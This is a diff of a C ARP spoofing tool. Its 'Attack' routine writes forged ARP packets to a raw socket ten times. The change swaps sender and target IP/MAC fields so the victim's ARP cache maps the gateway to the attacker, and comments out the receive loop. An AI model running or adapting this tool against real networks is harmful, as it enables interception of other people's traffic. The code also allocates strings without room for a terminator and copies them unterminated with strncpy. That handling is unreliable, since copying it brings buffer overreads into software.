@@ -33,6 +33,7 @@ void Attack(void* info){
   sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_RARP));
   if(sock<0){ perror("socket error"); exit(1); }
 
+  attack_packet.frame_type = htons(ARP_FRAME_TYPE);
   attack_packet.mac_type = htons(ETHER_MAC_TYPE);
   attack_packet.prot_type = htons(IP_PROTO_TYPE);
   attack_packet.mac_addr_size = ETH_MAC_ADDR_LEN;
@@ -337,26 +338,26 @@ arph->sender_mac_addr[1], arph->sender_mac_addr[2], arph->sender_mac_addr[3], ar
   delChar((char*)s_mac_addr, a_mac_addr, ':'); //s_mac_addr
 
 // ########## Make contents of parameters ##########
-  pt.sip = (char*)malloc(strlen(argv[1])); // sender's ip address
+  pt.sip = (char*)malloc(strlen(s_ip_addr)); // sender's ip address
   if(pt.sip == NULL){ perror("pt.argv_1 malloc error"); exit(1); }
   pt.smac = (char*)malloc(strlen(sender_mac)); // sender's mac address
   if(pt.smac == NULL){ perror("pt.argv_2 malloc error"); exit(1); }
 
-  pt.tip = (char*)malloc(strlen(s_ip_addr)); // attacker's ip address
+  pt.tip = (char*)malloc(strlen(argv[1])); // attacker's ip address
   if(pt.tip == NULL){ perror("pt.aIPaddr malloc error"); exit(1); }
   pt.tmac = (char*)malloc(strlen(gw_mac_addr)); // attacker's mac address
   if(pt.tmac == NULL){ perror("pt.aMACaddr malloc error"); exit(1); }
 
-  strncpy(pt.sip, argv[1], strlen(argv[1]));
-  strncpy(pt.smac, sender_mac, strlen(sender_mac));
-  strncpy(pt.tip, s_ip_addr, strlen(s_ip_addr));
-  strncpy(pt.tmac, gw_mac_addr, strlen(gw_mac_addr));
+  strncpy(pt.sip, s_ip_addr, strlen(s_ip_addr));
+  strncpy(pt.smac, gw_mac_addr, strlen(gw_mac_addr));
+  strncpy(pt.tip, argv[1], strlen(argv[1]));
+  strncpy(pt.tmac, sender_mac, strlen(sender_mac));
 // ########################################
 
 for(int i = 0; i < 10; i++) { Attack((void*)&pt); sleep(1); }
 
 // ########## Receiving packets ##########
-  int count = 0;
+  /*int count = 0;
   while (count < 10) {
     struct pcap_pkthdr* header;
     const u_char* packet;
@@ -388,7 +389,7 @@ for(int i = 0; i < 10; i++) { Attack((void*)&pt); sleep(1); }
     //if(packet){
     //  
     //}
-  }
+  }*/
   //pthread_join(thread, (void**)&status);
   //printf("Thread %d\n", status);
   pcap_close(handle);
